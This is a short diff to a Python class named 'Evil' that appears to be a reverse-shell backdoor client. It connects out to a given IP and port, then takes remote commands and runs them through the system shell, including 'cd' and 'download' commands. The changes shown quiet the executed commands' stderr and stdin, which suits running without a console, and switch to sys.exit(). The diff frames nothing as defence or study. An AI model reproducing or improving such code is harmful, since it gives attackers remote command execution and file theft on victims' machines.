@@ -9,6 +9,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 class Evil:
     def __init__(self,ip,port):
@@ -30,7 +31,8 @@ class Evil:
                 continue
 
     def exec_sys_cmd(self,cmd):
-        return subprocess.check_output(cmd,shell=True)
+        DEVNULL = open(os.devnull,'wb')
+        return subprocess.check_output(cmd,shell=True,stderr=DEVNULL,stdin=DEVNULL)
 
     def change_working_dir(self,path):
         os.chdir(path)
@@ -52,7 +54,7 @@ class Evil:
                 cmd = self.reliable_recv()
                 if cmd[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif cmd[0] == "cd" and len(cmd) > 1:
                     cmd_result = self.change_working_dir(cmd[1])
                 elif cmd[0] == "download" and len(cmd) > 1:
